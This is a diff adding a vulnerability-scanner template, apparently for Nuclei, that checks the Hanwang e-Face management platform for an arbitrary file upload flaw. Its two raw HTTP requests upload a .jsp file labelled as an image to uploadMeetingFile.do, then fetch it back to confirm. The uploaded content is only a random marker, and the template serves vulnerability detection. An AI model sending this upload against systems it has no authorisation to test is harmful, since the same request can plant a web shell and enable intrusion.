@@ -1,0 +1,46 @@
+id: hanwange-uploadMeetingFile-upload
+
+info:
+  name: 汉王e脸通综合管理平台 uploadMeetingFile.do 任意文件上传漏洞
+  author: hanwange
+  severity: high
+  tags: hanwange
+
+http:
+  - raw:
+      - |
+        POST /manage/meetingPersonal/uploadMeetingFile.do?recoToken=67mds2pxXQb&type= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
+        Content-Type: image/jpeg
+
+        {{randstr_1}}
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+      - |+
+        GET /manage/resource/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - '"path":"(.*?\.jsp)"'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
